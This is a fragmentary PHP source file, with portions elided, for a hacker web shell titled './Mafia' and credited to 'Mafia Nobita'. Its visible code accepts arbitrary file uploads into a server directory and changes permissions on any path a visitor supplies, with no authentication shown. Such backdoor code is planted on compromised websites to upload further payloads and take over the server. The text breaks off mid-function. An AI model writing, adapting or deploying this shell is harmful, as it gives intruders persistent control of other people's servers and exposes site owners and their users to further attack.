...
<link href="" rel="stylesheet" type="text/css">
	<link rel="shortcut icon" href="https://media1.tenor.com/images/1aed7ad750a6ab5cea7530a807620b62/tenor.gif" />
<title>./Mafia</title>
<style>
body{
font-family: "verdana";
...
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="yellow">Done ^_^</font><br />';
    }else{
    ...
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="yellow">^_^</font><br />';
            }else{
                echo '<font color="red">So bad</font><br />';
            }
        }
...
echo '<center><font color="red">Coded by : </font><font color="red">Mafia Nobita</font></center>
</BODY>
</HTML>';
function perms($file){
